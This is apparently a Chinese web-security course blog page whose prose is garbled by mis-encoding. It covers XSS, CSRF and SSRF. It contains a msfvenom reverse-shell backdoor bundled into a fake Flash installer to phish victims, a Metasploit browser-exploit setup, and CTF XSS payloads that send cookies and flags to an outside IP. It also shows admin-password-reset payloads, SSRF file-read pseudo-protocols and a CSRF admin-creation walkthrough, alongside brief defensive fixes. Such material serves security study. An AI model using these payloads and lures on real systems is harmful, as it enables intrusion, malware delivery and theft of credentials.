<h4 id="XSS-Flashé’“é±¼é…åˆMSFæ†ç»‘ä¸Šçº¿"><a href="#XSS-Flashé’“é±¼é…åˆMSFæ†ç»‘ä¸Šçº¿" class="headerlink" title="#XSS-Flashé’“é±¼é…åˆMSFæ†ç»‘ä¸Šçº¿"></a>#XSS-Flashé’“é±¼é…åˆMSFæ†ç»‘ä¸Šçº¿</h4><p>æ¡ä»¶ï¼šbeefä¸Šçº¿å—æ§åæˆ–ç›´æ¥é’“é±¼(å—å®³è€…çˆ±çœ‹SESE)                  â€”â€”â€“<a href="https://blog.csdn.net/weixin_43225966/article/details/130291934">https://blog.csdn.net/weixin_43225966/article/details/130291934</a><br>1ã€ç”Ÿæˆåé—¨<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;xx.xx.xx.xx LPORT&#x3D;6666-f exe<br>flash exe<br>2ã€ä¸‹è½½å®˜æ–¹æ–‡ä»¶ä¿è¯å®‰è£…æ­£å¸¸<br>3ã€å‹ç¼©æ†ç»‘æ–‡ä»¶-è§£å‹æå–è¿è¡Œ<br>4ã€MSFé…ç½®ç›‘å¬çŠ¶æ€<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;reverse tcp<br>set Ihost 0.0.0.0<br>set Iport 6666<br>run<br>5ã€è¯±ä½¿å—å®³è€…è®¿é—®URL-è¯­è¨€è¦é€‚å½“<br>å‰æœŸå‡†å¤‡ï¼šåé—¨æ–‡ä»¶å‡†å¤‡ï¼šmsfç”Ÿæˆåé—¨.exeæ–‡ä»¶ï¼Œé€šè¿‡å‹ç¼©å°†åé—¨æ–‡ä»¶å’Œflashå®‰è£…æ–‡ä»¶æ”¾ä¸€èµ·ï¼Œå‹ç¼©æ—¶é€‰æ‹©è§£å‹å‰è¿è¡Œ.exeæ–‡ä»¶ï¼Œå¯å¯¹åé—¨æ–‡ä»¶åšå…æ€<br>è¯±ä½¿å—å®³è€…è®¿é—®æ„é€ å¥½çš„flashé¡µé¢â€“ç‚¹å‡»ä¸‹è½½å‡ºæ’å…¥xssè¯­å¥â€“æ‰§è¡Œåé—¨æ–‡ä»¶ä¸‹è½½â€“å‹ç¼©æ—¶è¿è¡Œ â€“ä¸Šçº¿</p>
<h4 id="XSS-æµè§ˆå™¨ç½‘é©¬é…åˆMSFè®¿é—®ä¸Šçº¿"><a href="#XSS-æµè§ˆå™¨ç½‘é©¬é…åˆMSFè®¿é—®ä¸Šçº¿" class="headerlink" title="#XSS-æµè§ˆå™¨ç½‘é©¬é…åˆMSFè®¿é—®ä¸Šçº¿"></a>#XSS-æµè§ˆå™¨ç½‘é©¬é…åˆMSFè®¿é—®ä¸Šçº¿</h4><p>æ¡ä»¶ï¼šbeefä¸Šçº¿å—æ§åæˆ–ç›´æ¥é’“é±¼(æµè§ˆå™¨å­˜åœ¨0day)<br>1ã€é…ç½®MSFç”ŸæˆURL<br>use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution<br>set allowpowershellprompt true<br>set target 1<br>run<br>2ã€è¯±ä½¿å—å®³è€…è®¿é—®URL-è¯­è¨€è¦é€‚å½“<br>æ€è·¯ï¼šè¯±ä½¿å—å®³è€…è®¿é—®å«æœ‰beefxss è¯­å¥çš„ç½‘ç«™é¡µé¢â€“beefxsså¹³å°æ‰§è¡Œç½‘ç«™è·³è½¬â€“è·³è½¬åˆ°å«æœ‰payloadçš„ç½‘ç«™â€“ä¸Šçº¿   </p>
<h1 id="ç¬¬38å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-XSSè·¨ç«™-ç»•è¿‡ä¿®å¤-http-only-CSP-æ ‡ç­¾ç¬¦å·"><a href="#ç¬¬38å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-XSSè·¨ç«™-ç»•è¿‡ä¿®å¤-http-only-CSP-æ ‡ç­¾ç¬¦å·" class="headerlink" title="ç¬¬38å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;XSSè·¨ç«™&amp;ç»•è¿‡ä¿®å¤&amp;http-only&amp;CSP&amp;æ ‡ç­¾ç¬¦å·"></a>ç¬¬38å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;XSSè·¨ç«™&amp;ç»•è¿‡ä¿®å¤&amp;http-only&amp;CSP&amp;æ ‡ç­¾ç¬¦å·</h1><h4 id="çŸ¥è¯†ç‚¹-3"><a href="#çŸ¥è¯†ç‚¹-3" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p>4ã€ä¿®å¤<br>1ã€è¿‡æ»¤ä¸€äº›å±é™©å­—ç¬¦<br>2ã€HTTP-only Cookie<br>3ã€è®¾ç½®CSP(Content Security Policy)<br>4ã€è¾“å…¥å†…å®¹é•¿åº¦é™åˆ¶ï¼Œè½¬ä¹‰ç­‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-16"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-16" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>XSSç»•è¿‡-CTFSHOW-361åˆ°331å…³å¡ç»•è¿‡WP<br>XSSä¿®å¤-è¿‡æ»¤æ¶µæ•°&amp;http_only&amp;CSP&amp;é•¿åº¦é™åˆ¶</p>
<p>ç»•è¿‡ï¼šhttps:z.aliyun.com&#x2F;t&#x2F;4067</p>
<p>ctfshowåˆ·é¢˜è®°å½•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">316-åå°„å‹ç›´æ¥è¿œç¨‹è°ƒç”¨</span><br><span class="line">å‰ç½®çŸ¥è¯†ï¼šdocument.cookieæ˜¯ç”¨æ¥ç›´æ¥è·å–cookieçš„ï¼Œwindow.location.hrefæ˜¯è·å–è·³è½¬åœ°å€çš„</span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line">317-åå°„å‹-è¿‡æ»¤&lt;script&gt;</span><br><span class="line">&lt;img src=1onerror=window.location.href=&#x27;http://47.94.236.117/getphp?c=&#x27;+document cookie,&gt;</span><br><span class="line">318  319-åå°„å‹-è¿‡æ»¤&lt;img&gt;</span><br><span class="line">&lt;inputonload=&quot;window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document.cookie:&quot;&gt;</span><br><span class="line">&lt;svgonload=&quot;window.location.href=&#x27;http://47.94.236.117/getphp?c=&#x27;+document cookie;&quot;&gt;</span><br><span class="line">320-326-åå°„å‹è¿‡æ»¤ç©ºæ ¼</span><br><span class="line">&lt;svg/onload=&quot;window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document cookie;&quot;</span><br><span class="line">327å­˜å‚¨å‹æ— è¿‡æ»¤</span><br><span class="line">&lt;script&gt;window.location href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document cookie&lt;/script&gt;</span><br><span class="line">328å­˜å‚¨å‹æ³¨å†Œæ’å…¥JS</span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document cookie&lt;/script&gt;</span><br><span class="line">æ€è·¯ï¼šåœ¨å¯†ç å¤„æ’å…¥xssè¯­å¥--è·å–cookie--æŠ“åŒ…æ›¿æ¢cookie--ç®¡ç†å‘˜æƒé™è·å–flagï¼ˆç”¨æˆ·åå¤„ä¼šè¿‡æ»¤æŸäº›å…³é”®å­— æ‰‹åŠ¨ç‹—å¤´ï¼‰</span><br><span class="line">329 å­˜å‚¨å‹ å¤±æ•ˆå‡­æ®éœ€1æ­¥å®Œæˆæ‰€éœ€æ“ä½œ</span><br><span class="line">æ€è·¯ï¼šåˆ©ç”¨jsè¯­å¥ç›´æ¥è¯»å–ç®¡ç†å‘˜é¡µé¢ä¸­æ ‡ç­¾ä¸­çš„flagç„¶åé€šè¿‡xssè¯­å¥å‘é€åˆ°vps</span><br><span class="line">&lt;script&gt;</span><br><span class="line">$(&#x27;.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;if(value.innerText.indexOf(&#x27;ctfshow&#123;&#x27;)&gt;-1)&#123;location.href=&#x27;http://ip/x.php?cookie=&#x27;+value.innerText&#125;&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">330-å­˜å‚¨å‹-å€ŸåŠ©ä¿®æ”¹å¯†ç é‡ç½®ç®¡ç†å‘˜å¯†ç (GET)  ç±»ä¼¼äºcrsfï¼Œé€šè¿‡xssä»£ç æ³¨å†Œï¼Œä½¿å¾—ç®¡ç†å‘˜æ‰§è¡Œä¿®æ”¹å¯†ç çš„è¯­å¥ï¼Œæ”»å‡»è€…è·å¾—å¯†ç åå³å¯</span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://127.0.0.1/api/change.php?p=123&#x27;;&lt;/script&gt;</span><br><span class="line">331-å­˜å‚¨å‹å€ŸåŠ©ä¿®æ”¹å¯†ç é‡ç½®ç®¡ç†å‘˜å¯†ç P0ST)</span><br><span class="line">&lt;script&gt;$.ajax(&#123;url &#x27;http://127.0.0.1/api/change.php&#x27;type&#x27;post&#x27;.data &#123;p&#x27;123&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="XSSä¿®å¤-è¿‡æ»¤å‡½æ•°-http-only-CSP-é•¿åº¦é™åˆ¶"><a href="#XSSä¿®å¤-è¿‡æ»¤å‡½æ•°-http-only-CSP-é•¿åº¦é™åˆ¶" class="headerlink" title="#XSSä¿®å¤-è¿‡æ»¤å‡½æ•°&amp;http_only&amp;CSP&amp;é•¿åº¦é™åˆ¶"></a>#XSSä¿®å¤-è¿‡æ»¤å‡½æ•°&amp;http_only&amp;CSP&amp;é•¿åº¦é™åˆ¶</h4><p>1ã€è¿‡æ»¤ä¸€äº›å±é™©å­—ç¬¦ï¼Œä»¥åŠè½¬ä¹‰&amp; &lt;&gt; â€œ Â·ç­‰å±é™©å­—ç¬¦<br>è‡ªå®šä¹‰è¿‡æ»¤å‡½æ•°å¼•ç”¨<br>2ã€HTTP-only Cookie<br><a href="https://www.php.cn/php-ask-457831.html">https://www.php.cn/php-ask-457831.html</a><br>php.in è®¾ç½®æˆ–ä»£ç å¼•ç”¨<br>session.cookie httponly &#x3D;1<br>ini set(â€œsession.cookie httponlyâ€,1);</p>
<p>http-onlyçš„è®¾ç½®èƒ½å¤Ÿå»é˜²æ­¢cookieè¢«<strong>å®Œå…¨</strong>çš„ç›—å–ï¼Œä½¿jsè„šæœ¬æ— æ³•è·å–å®Œæ•´å…¨éƒ¨çš„cookie</p>
<p>ç›¸å…³æ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_38553333/article/details/80055521">https://blog.csdn.net/qq_38553333/article/details/80055521</a></p>
<p>3ã€è®¾ç½®CSP(Content Security Policy) é˜²æ­¢èµ„æºå¤–å‘ é˜²æ­¢ç½‘é¡µåŠ è½½æ¶æ„è„šæœ¬å’Œå…¶ä»–å±é™©èµ„æº<br><a href="https://blog.csdn.net/a1766855068/article/details/89370320">https://blog.csdn.net/a1766855068/article/details/89370320</a><br>header(â€œContent-Security-Policy:img-src â€˜self â€œ)<br>4ã€è¾“å…¥å†…å®¹é•¿åº¦é™åˆ¶ï¼Œå®ä½“è½¬ä¹‰ç­‰</p>
<h1 id="ç¬¬40å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-CSRF-SSRF-åè®®ç©æ³•-å†…ç½‘æ¢é’ˆ-æ¼æ´åˆ©ç”¨"><a href="#ç¬¬40å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-CSRF-SSRF-åè®®ç©æ³•-å†…ç½‘æ¢é’ˆ-æ¼æ´åˆ©ç”¨" class="headerlink" title="ç¬¬40å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;CSRF&amp;SSRF&amp;åè®®ç©æ³•&amp;å†…ç½‘æ¢é’ˆ&amp;æ¼æ´åˆ©ç”¨"></a>ç¬¬40å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;CSRF&amp;SSRF&amp;åè®®ç©æ³•&amp;å†…ç½‘æ¢é’ˆ&amp;æ¼æ´åˆ©ç”¨</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-20"><a href="#çŸ¥è¯†ç‚¹ï¼š-20" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€CSRF-åŸç†&amp;å±å®³&amp;æ¢é’ˆ&amp;åˆ©ç”¨ç­‰<br>2ã€SSRF-åŸç†&amp;å±å®³&amp;æ¢é’ˆ&amp;åˆ©ç”¨ç­‰<br>3ã€CSRF&amp;SSRF-é»‘ç›’ä¸‹æ¼æ´æ¢é’ˆç‚¹</p>
<h4 id="è¯¦ç»†ç‚¹ï¼š-7"><a href="#è¯¦ç»†ç‚¹ï¼š-7" class="headerlink" title="#è¯¦ç»†ç‚¹ï¼š"></a>#è¯¦ç»†ç‚¹ï¼š</h4><p><a href="https://blog.csdn.net/qq_43378996/article/details/123910614">https://blog.csdn.net/qq_43378996/article/details/123910614</a>         â€”â€”CSRFè¯¦è§£</p>
<p>CSRFå…¨ç§°ï¼šCross-site request forgery,å³ï¼Œè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œä¹Ÿè¢«ç§°ä¸ºâ€œOne Click Attackâ€æˆ–â€œSession Ridingâ€ï¼Œé€šå¸¸ç¼©å†™ä¸ºCSRFæˆ–è€…XSRF,ï¼Œæ˜¯ä¸€ç§å¯¹ç½‘ç«™çš„æ¶æ„åˆ©ç”¨ã€‚ä¸¾ä¸ªç”Ÿæ´»ä¸­çš„ä¾‹å­ï¼šå°±æ˜¯æŸä¸ªäººç‚¹äº†ä¸ªå¥‡æ€ªçš„é“¾æ¥ï¼Œè‡ªå·±ä»€ä¹ˆä¹Ÿæ²¡è¾“ï¼Œä½†è‡ªå·±çš„qgå·æˆ–å…¶ä»–çš„å·å°±è¢«ç›—äº†ã€‚å³è¯¥æ”»å‡»å¯ä»¥åœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»¥å—å®³è€…åä¹‰ä¼ªé€ è¯·æ±‚ï¼Œæ‰§è¡Œæ¶æ„æ“ä½œï¼Œå…·æœ‰å¾ˆå¤§çš„å±å®³æ€§ã€‚<br>CSRFçš„æ”»å‡»è¿‡ç¨‹ä¸¤ä¸ªæ¡ä»¶ï¼š<br>1ã€ç›®æ ‡ç”¨æˆ·å·²ç»ç™»å½•äº†ç½‘ç«™ï¼Œèƒ½å¤Ÿæ‰§è¡Œç½‘ç«™çš„åŠŸèƒ½ã€‚<br>2ã€ç›®æ ‡ç”¨æˆ·è®¿é—®äº†æ”»å‡»è€…æ„é€ çš„URL,<br>CSRFå®‰å…¨é—®é¢˜é»‘ç›’æ€ä¹ˆåˆ¤æ–­ï¼š<br>1ã€çœ‹éªŒè¯æ¥æºä¸-ä¿®å¤<br>2ã€çœ‹å‡­æ®æœ‰æ— token-ä¿®å¤<br>3ã€çœ‹å…³é”®æ“ä½œæœ‰æ— éªŒè¯-ä¿®å¤<br>-CSRFå®‰å…¨é—®é¢˜ç™½ç›’æ€ä¹ˆå®¡è®¡ï¼š<br>åŒé»‘ç›’æ€è·¯ä¸€æ ·ï¼Œä»£ç ä¸­åˆ†æä¸Šè¿°ä¸‰çœ‹</p>
<p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼åŒã€‚ä¸€è‚¡æƒ…å†µä¸‹ï¼ŒSSå‡¡Fæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”é«˜çš„å†…éƒ¨ç³»ç»Ÿï¼‰SSRFå½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ åœ°å€ç­‰<br>SSRFé»‘ç›’å¯èƒ½å‡ºç°çš„åœ°æ–¹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.ç¤¾äº¤åˆ†äº«åŠŸèƒ½ï¼šè·å–è¶…é“¾æ¥çš„æ ‡é¢˜ç­‰å†…å®¹è¿›è¡Œæ˜¾ç¤º</span><br><span class="line">2.è½¬ç æœåŠ¡ï¼šé€šè¿‡ULåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ</span><br><span class="line">3.åœ¨çº¿åˆ°è¯‘ï¼šç»™ç½‘æ­¢åˆ°è¯‘å¯¹åº”ç½‘é¡µçš„å†…å®¹</span><br><span class="line">4å›¾ç‰‡åŠ è½½ä¸‹è½½ï¼šä¾‹å¦‚å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ä¸­çš„ç‚¹å‡»ä¸‹è½½å›¾ç‰‡åˆ°æœ¬åœ°ï¼›é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</span><br><span class="line">5.å›¾ç‰‡æ–‡ç« æ”¶è½½åŠŸèƒ½ï¼šä¸»è¦å…¶ä¼šå–URLåœ°å€ä¸­titlä»¥åŠæ–‡æœ¬çš„å†…å®¹ä½œä¸ºæ˜¾ç¤ºä»¥æ±‚ä¸€ä¸ªå¥½çš„ç”¨å…·ä½“éªŒ</span><br><span class="line">6.äº‘æœåŠ¡å‚å•†ï¼šå®ƒä¼šè¿œç¨‹æ‰§è¡Œä¸€äº›å‘½ä»¤æ¥åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜æ´»ç­‰ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥æ•è·ç›¸åº”çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥è¿›è¡Œssrfæµ‹è¯•</span><br><span class="line">7.ç½‘ç«™é‡‡é›†ï¼Œç½‘ç«™æŠ“å–çš„åœ°æ–¹ï¼šä¸€äº›ç½‘ç«™ä¼šé’ˆå¯¹ä½ è¾“å…¥çš„uè¿›è¡Œä¸€äº›ä¿¡æ‚¬é‡‡é›†å·¥ä½œ</span><br><span class="line">8.æ•°ååº“å†…ç½®åŠŸèƒ½ï¼šæ•°æ®åº“çš„æ¯”å¦‚mongodbçš„copyDatabaseå‡½è‡´</span><br><span class="line">9.é‚®ä»¶ç³»ç»Ÿï¼šæ¯”å¦‚æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€</span><br><span class="line">10.ç¼–ç å¤„ç†ï¼Œå±æ€§ä¿¡æ¯å¤„ç†ï¼Œæ–‡ä»¶å¤„ç†ï¼šæ¯”å¦‚fpmg,ImageMagick,docX,pdf,Xmlæ”¶å¤„ç†å™¨ç­‰</span><br><span class="line">11.æœªå…¬å¼€çš„piå®ç°ä»¥åŠå…¶ä»–æ‰©å±•è°ƒç”¨URLçš„åŠŸèƒ½ï¼šå¯ä»¥åˆ©ç”¨g0ogleè¯­æ³•åŠ¨åŠ ä¸Šè¿™äº›å…³é”®å­—å»å¯»æ‰¾SSRFæ¼æ´ä¸€äº›çš„urlä¸­çš„å…³é”®å­—ï¼šshareã€wapã€urlã€inkã€srcã€sourceã€targetã€.uã€3gã€displayã€sourceURIã€imageURLã€domain.-.-</span><br><span class="line">12.ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼ˆupload from urlå¦‚discuz!;mpot&amp;expost rss feedå¦‚webblog;ä½¿ç”¨äº†xmiå†™å¼•æ“å¯¹è±¡çš„åœ°æ–¹å¦‚vordpress xmlrpc.php)</span><br></pre></td></tr></table></figure>

<p>å¯èƒ½åˆ©ç”¨çš„ä¼ªåè®®ï¼š            â€”â€”â€”-ç‰¹åˆ«æ˜¯åœ¨ctfèµ›é¢˜ä¸­ï¼Œç»å¸¸ä¼šå‡ºç°è¿™ä¸ªã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:/// ä»æ–‡ä»¶ç³»ç»Ÿä¸­è·å–æ–‡ä»¶å†…å®¹ï¼Œå¦‚ï¼Œfile:///etc/passwd</span><br><span class="line">dict:// å­—å…¸æœåŠ¡å™¨åè®®ï¼Œè®¿é—®å­—å…¸èµ„æºï¼Œå¦‚ï¼Œdict:///ip:6739/infoï¼š</span><br><span class="line">sftp:// SSHæ–‡ä»¶ä¼ è¾“åè®®æˆ–å®‰å…¨æ–‡ä»¶ä¼ è¾“åè®®</span><br><span class="line">ldap:// è½»é‡çº§ç›®å½•è®¿é—®åè®®</span><br><span class="line">tftp:// ç®€å•æ–‡ä»¶ä¼ è¾“åè®®</span><br><span class="line">gopher:// åˆ†å¸ƒå¼æ–‡æ¡£ä¼ é€’æœåŠ¡ï¼Œå¯ä½¿ç”¨gopherusç”Ÿæˆpayload</span><br></pre></td></tr></table></figure>

<p>-SSRFç™½ç›’å¯èƒ½å‡ºç°çš„åœ°æ–¹ï¼š</p>
<p>1ã€åŠŸèƒ½ç‚¹æŠ“åŒ…æŒ‡å‘ä»£ç å—å®¡è®¡</p>
<p>2ã€åŠŸèƒ½ç‚¹å‡½æ•°å®šä½ä»£ç å—å®¡è®¡</p>
<p>-SSRFå¸¸è§å®‰å…¨ä¿®å¤é˜²å¾¡æ–¹æ¡ˆï¼š<br>1ã€ç¦ç”¨è·³è½¬</p>
<p>2ã€ç¦ç”¨ä¸éœ€è¦çš„åè®®</p>
<p>3ã€å›ºå®šæˆ–é™åˆ¶èµ„æºåœ°å€</p>
<p>4ã€é”™è¯¯ä¿¡æ¯ç»Ÿä¸€ä¿¡æ¯å¤„ç†</p>
<p><img src="https://img-blog.csdnimg.cn/direct/607f655f46a045e68d3aa0053dfd2857.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h4 id="ç³»åˆ—å†…å®¹ç‚¹ï¼š"><a href="#ç³»åˆ—å†…å®¹ç‚¹ï¼š" class="headerlink" title="#ç³»åˆ—å†…å®¹ç‚¹ï¼š"></a>#ç³»åˆ—å†…å®¹ç‚¹ï¼š</h4><p>1ã€CSRF&amp;SSRF&amp;åŸç†&amp;åˆ©ç”¨&amp;åè®®ç­‰<br>2ã€CSRF&amp;SSRF&amp;é»‘ç›’&amp;å®¡è®¡&amp;ä¿®å¤ç­‰</p>
<p>æ¼”ç¤ºæ¡ˆä¾‹ï¼š<br>CSRF-åŸç†&amp;åå°è‡ªåŠ¨æ·»åŠ ç®¡ç†å‘˜<br>SSRF-åŸç†&amp;æœåŠ¡&amp;åè®®&amp;å†…ç½‘&amp;æ¼æ´<br>SSRF-æŸå®é™…æ¡ˆä¾‹æµ‹è¯•æ¼”ç¤ºï¼ˆåŠŸèƒ½ç‚¹ï¼‰</p>
<h4 id="CSRF-åŸç†-åå°è‡ªåŠ¨æ·»åŠ ç®¡ç†å‘˜"><a href="#CSRF-åŸç†-åå°è‡ªåŠ¨æ·»åŠ ç®¡ç†å‘˜" class="headerlink" title="#CSRF-åŸç†&amp;åå°è‡ªåŠ¨æ·»åŠ ç®¡ç†å‘˜"></a>#CSRF-åŸç†&amp;åå°è‡ªåŠ¨æ·»åŠ ç®¡ç†å‘˜</h4><p>æ¡ˆä¾‹è¯´æ˜ï¼šå°è¿ªåœ¨ç™»å½•åå°ç®¡ç†è‡ªå·±ç½‘ç«™çš„æ—¶å€™ï¼Œçªç„¶ç¾¤é‡Œç»™å°è¿ªè¯´é˜¿ç¥–åˆè¯´çˆ±ä¸Šåˆ«äººäº†ï¼Œéšåç»™æˆ‘å‘äº†ä¸ªURLé“¾æ¥ï¼Œå°è¿ªç›´æ¥ç‚¹äº†è¿›å»ï¼ŒGG!<br>å°è¿ªçš„ç½‘ç«™ï¼šhtp:&#x2F;test.xiaodi8.com&#x2F;<br>å‘é€çš„URL:htp:âˆ¥47.94.236.117&#x2F;add.html<br>åˆ©ç”¨æµç¨‹ï¼š<br>1ã€è·å–ç›®æ ‡çš„è§¦å‘æ•°æ®åŒ…<br>2ã€åˆ©ç”¨CSRFTestertæ„é€ å¯¼å‡º<br>3ã€è¯±ä½¿å—å®³è€…è®¿é—®ç‰¹å®šåœ°å€è§¦å‘<br>ä¸Šé¢çš„é‚£ä¸ªadd.htmlå°±æ˜¯å¢åŠ ç®¡ç†å‘˜å‘½ä»¤çš„é‚£ä¸ªæ•°æ®åŒ…ï¼Œè‡³äºè¿™ä¸ªURLçš„æ„é€ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨CSRFTesterè¿™ä¸ªå·¥å…·æ¥æ„é€ ï¼Œå…·ä½“çš„æµç¨‹å°±æ˜¯é¦–å…ˆé€šè¿‡å‰æœŸçš„ä¿¡æ¯æ”¶é›†å¾—çŸ¥è¿™ä¸ªç½‘ç«™æ˜¯ç”±ä»€ä¹ˆç³»ç»Ÿæ­å»ºçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨æœ¬åœ°æ­å»ºä¸ªä¸€æ ·çš„ï¼Œç„¶åæ‰“å¼€è¿™ä¸ªå·¥å…·ï¼Œé¦–å…ˆç‚¹å‡»startï¼Œå¹¶ä¸”æµè§ˆå™¨ä¹Ÿè¦è®¾ç½®ä»£ç†ä¸ºæœ¬åœ°çš„8008ç«¯å£ï¼Œç„¶ååœ¨æµè§ˆå™¨æ‰§è¡Œæ·»åŠ ç®¡ç†å‘˜çš„æ“ä½œï¼ŒæŠ“åˆ°åŒ…ä¹‹åå°±ç”¨fromå½¢å¼ï¼Œç„¶åç‚¹å‡»å³ä¸‹è§’ä¿å­˜å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„åœ°å€ï¼Œç„¶åè¿˜è¦å¯¹è¿™ä¸ªæ•°æ®åŒ…è¿›è¡Œä¿®æ”¹ï¼Œåªä¿ç•™é‚£ä¸ªrequest2çš„ï¼Œå…¶ä»–çš„å…¨éƒ¨åˆ æ‰ã€‚<br>CSRFæ”»å‡»éœ€è¦æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼šç½‘ç«™åœ¨ç®¡ç†å‘˜ç™»å½•çŠ¶æ€(æˆ–åˆ™ä¸æ˜¯ç½‘ç«™çš„è¯å…¶ä»–çš„ä¹Ÿå¾—æ˜¯ç™»é™†çŠ¶æ€)ï¼Œç„¶åèƒ½æ„é€ æ•°æ®åŒ…ï¼Œå¹¶ä¸”æ„é€ çš„åœ°å€å¯¹æ–¹ä¼šç‚¹å‡»ã€‚ä¸‰ä¸ªæ¡ä»¶ç¼ºä¸€ä¸å¯ã€‚<br>é€šä¿—çš„è§£é‡ŠCSRF:</p>
<p>â€œæ”»å‡»è€…ç›—ç”¨äº†ä½ çš„èº«ä»½ï¼Œä»¥ä½ çš„åä¹‰å‘é€æ¶æ„è¯·æ±‚â€ï¼ŒCSRFæ˜¯ä¸€ç§ä¾èµ–webæµè§ˆå™¨çš„ã€è¢«æ··æ·†è¿‡çš„ä»£ç†äººæ”»å‡»ï¼Œå¾€å¾€æ¶‰åŠåˆ°ä¸ªäººéšç§æ³„éœ²ä»¥åŠè´¢äº§å®‰å…¨ã€‚</p>
<p>csrfé»‘ç›’é¦–å…ˆçœ‹æœ‰æ— tokenï¼Œç¬¬äºŒç‚¹çœ‹èƒ½å¤Ÿè§¦å‘çš„æ•°æ®åŒ…çš„åœ°å€æ˜¯ä¸æ˜¯ç®¡ç†å‘˜ç›´æ¥è®¿é—®å°±å¯ä»¥ç›´æ¥è§¦å‘æˆåŠŸï¼Œæœ‰æ²¡æœ‰éªŒè¯è¿‡ç¨‹ï¼Œæœ‰çš„è¯èƒ½ä¸èƒ½ç»•è¿‡ï¼Œä¸èƒ½ç»•è¿‡å°±ggï¼Œç¬¬ä¸‰ä¸ªçœ‹åŒæºç­–ç•¥ï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡æŠ“åŒ…å»ä¿®æ”¹referçš„å€¼.</p>
